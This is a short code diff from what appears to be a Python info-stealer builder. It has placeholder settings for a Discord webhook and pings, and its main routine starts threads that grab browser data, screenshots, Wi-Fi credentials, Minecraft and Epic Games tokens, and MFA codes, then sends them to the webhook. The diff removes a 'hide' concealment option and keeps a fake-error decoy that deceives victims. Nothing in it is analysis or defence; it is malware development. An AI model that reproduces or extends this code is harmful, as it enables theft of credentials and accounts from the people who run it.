@@ -24,17 +24,11 @@ __WEBHOOK__ = "%webhook_here%"
 __PING__ = "%ping_enabled%"
 __PINGTYPE__ = "%ping_type%"
 __ERROR__ = "%_error_enabled%"
-__HIDE__ = "%_hide_enabled%"
 
 def main(webhook: str):
     webhook = SyncWebhook.from_url(webhook, session=requests.Session())
         
     threads = [browsers, ss, grabwifi, mc_tokens, epicgames_data, mfa_codes]
-
-    if __HIDE__:
-        threads.append(hide)
-    elif __HIDE__ == False:
-        pass
     
     if __ERROR__:
         threads.append(fakeerror)
